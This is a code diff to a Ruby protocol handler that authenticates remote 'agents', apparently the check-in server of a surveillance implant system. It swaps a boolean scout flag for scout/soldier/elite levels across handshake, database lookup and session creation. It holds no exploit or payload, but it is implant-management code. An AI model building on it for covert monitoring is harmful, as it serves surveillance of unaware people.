@@ -125,7 +125,7 @@ class Protocol
     platform.delete!("\x00")
     demo = platform.end_with? '-DEMO'
     platform.gsub!(/-DEMO/, '')
-    scout = false
+    level = :elite
 
     # random key part chosen by the server
     ks = SecureRandom.random_bytes(16)
@@ -147,7 +147,7 @@ class Protocol
     message = aes_encrypt(ks, DB.instance.agent_signature)
 
     # ask the database the status of the agent
-    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+    status, aid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, level)
 
     # if the agent was completely removed from the db we don't have the good flag anymore
     # and the rest call defaults to "bad", but if it's trying to sync on a good anon we
@@ -179,7 +179,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, scout, k, peer)
+        cookie = SessionManager.instance.create(aid, build_id_real, instance_id, platform, demo, level, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
@@ -274,9 +274,14 @@ class Protocol
     demo = (demo.first == 1) ? true : false
     trace :debug, "[#{peer}] Auth -- demo: " << demo.to_s
 
-    scout = message.slice!(0).unpack('C')
-    scout = (scout.first == 1) ? true : false
-    trace :debug, "[#{peer}] Auth -- scout: " << scout.to_s
+    level = message.slice!(0).unpack('C')
+    case level.first
+      when 1
+        level = :scout
+      when 2
+        level = :soldier
+    end
+    trace :debug, "[#{peer}] Auth -- level: #{level}"
 
     flags = message.slice!(0).unpack('C')
     trace :debug, "[#{peer}] Auth -- flags: " << flags.to_s
@@ -297,7 +302,7 @@ class Protocol
     end
 
     # ask the database the status of the agent
-    status, bid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, scout)
+    status, bid, good = DB.instance.agent_status(build_id_real, instance_id, platform, demo, level)
 
     # if the agent was completely removed from the db we don't have the good flag anymore
     # and the rest call defaults to "bad", but if it's trying to sync on a good anon we
@@ -333,7 +338,7 @@ class Protocol
         response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
-        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, scout, k, peer)
+        cookie = SessionManager.instance.create(bid, build_id_real, instance_id, platform, demo, level, k, peer)
 
         trace :info, "[#{peer}] Authentication phase 2 completed [#{cookie}]"
     end
